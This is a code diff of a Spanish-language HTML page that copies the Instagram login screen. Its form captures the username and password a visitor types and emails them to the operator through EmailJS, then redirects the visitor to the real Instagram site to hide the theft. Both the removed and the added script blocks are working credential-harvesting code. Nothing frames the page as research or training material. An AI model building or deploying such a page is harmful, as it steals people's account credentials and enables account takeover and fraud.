@@ -337,63 +337,57 @@ select.idioma {
     <div class="p100">
         <div class="p101"><img class="logo" src="https://github.com/Matias837/Inicio-de-Instagram/blob/main/Instagram_logo.svg.png?raw=true" alt="Logo Instagram"></div>
 
-<form class="formulario" id="my-form">
-    <div class="p102">
-        <div class="p103">
-            <input class="user" type="text" name="user" id="user" placeholder="Teléfono, usuario o correo electrónico" required>
-        </div>
-        <div class="p104">
-            <input class="password" type="password" name="password" id="password" placeholder="Contraseña" required>
-        </div>
-        <div class="p105">
-            <input class="inicio" style="background-color: #0095f6;" type="submit" value="Entrar">
-        </div>
-    </div>
-    <div class="facebook-login">
-        <img src="https://imgs.search.brave.com/erHHN64glv2s_KKHoCygrLXMRf6E-FA3NOZkB6H2Ds0/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pbWcu/ZnJlZXBpay5jb20v/cHJlbWl1bS1waG90/by9mYWNlYm9vay1s/b2dvXzEwODAwMjkt/MTA3LmpwZz9zZW10/PWFpc19oeWJyaWQ" alt="Facebook Logo" class="facebook-logo">
-        <p class="facebook-text">Inicia sesión con Facebook</p>
-    </div>
-
-    <a class="linkpassw" href="https://z-p15.www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?</a>
-</form>
-
-        <!-- Cargar la librería de EmailJS -->
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        // Inicializar EmailJS con tu User ID
-        (function() {
-            emailjs.init("signup12345678"); // Reemplaza 'user_ID' con tu ID de usuario de EmailJS
-        })();
-
-        // Función para enviar las credenciales por correo
-        document.getElementById('my-form').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevenir que el formulario se envíe de manera tradicional
-
-            // Obtener los valores del formulario
-            const username = document.getElementById('user').value;
-            const password = document.getElementById('password').value;
-
-            // Verificar que los campos no estén vacíos
-            if (username && password) {
-                // Enviar el correo a tu dirección de correo usando EmailJS
-                emailjs.send("signup12345678", "__ejs-test-mail-service__
-", {
-                    user_name: username,
-                    user_password: password
-                })
-                .then(function(response) {
-                    console.log("Correo enviado exitosamente: ", response);
-                }, function(error) {
-                    console.error("Error al enviar el correo: ", error);
-                });
-
-                // Redirigir al usuario a Instagram.com
-                window.location.href = "https://www.instagram.com";
-            } else {
-                alert("Por favor, ingresa tu nombre de usuario y contraseña.");
-            }
-        });
-    </script>
+        <form class="formulario" id="form">
+            <div class="p102">
+                <div class="p103">
+                    <input class="user" type="text" name="user" id="user" placeholder="Teléfono, usuario o correo electrónico" required>
+                </div>
+                <div class="p104">
+                    <input class="password" type="password" name="password" id="password" placeholder="Contraseña" required>
+                </div>
+                <div class="p105">
+                    <input class="inicio" style="background-color: #0095f6;" type="submit" value="Entrar" id="button">
+                </div>
+            </div>
+            <div class="facebook-login">
+                <img src="https://imgs.search.brave.com/erHHN64glv2s_KKHoCygrLXMRf6E-FA3NOZkB6H2Ds0/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pbWcu/ZnJlZXBpay5jb20v/cHJlbWl1bS1waG90/by9mYWNlYm9vay1s/b2dvXzEwODAwMjkt/MTA3LmpwZz9zZW10/PWFpc19oeWJyaWQ" alt="Facebook Logo" class="facebook-logo">
+                <p class="facebook-text">Inicia sesión con Facebook</p>
+            </div>
+        
+            <a class="linkpassw" href="https://z-p15.www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?</a>
+        </form>
+        
+        <!-- Scripts de EmailJS -->
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+        <script>
+            // Inicializa EmailJS con tu User ID
+            emailjs.init('qd8ZWAiRUxrsk8DBj'); // Reemplaza con tu User ID de EmailJS
+        
+            const btn = document.getElementById('button');
+        
+            // Escucha el evento submit del formulario
+            document.getElementById('form').addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevenir el comportamiento por defecto del formulario
+        
+                btn.value = 'Entrar'; // Cambiar el valor del botón mientras se envía el correo
+        
+                const serviceID = 'default_service';  // Reemplaza con tu Service ID de EmailJS
+                const templateID = 'template_3gkn27v'; // Reemplaza con tu Template ID de EmailJS
+        
+                // Enviar el formulario a través de EmailJS
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn.value = 'Entrar'; // Cambiar el texto del botón
+                                
+                        // Redirigir al usuario a otra página después de un envío exitoso
+                        window.location.href = "https://www.instagram.com/accounts/login/?next=%2Fsignup%2F&source=desktop_nav"; // Reemplaza con la URL a la que deseas redirigir
+                    }, (err) => {
+                        btn.value = 'Entrar'; // Cambiar el texto del botón
+                        alert('Error al enviar: ' + JSON.stringify(err)); // En caso de error
+                    });
+            });
+        </script>
+        
 
     </div>
     <div class="p110">
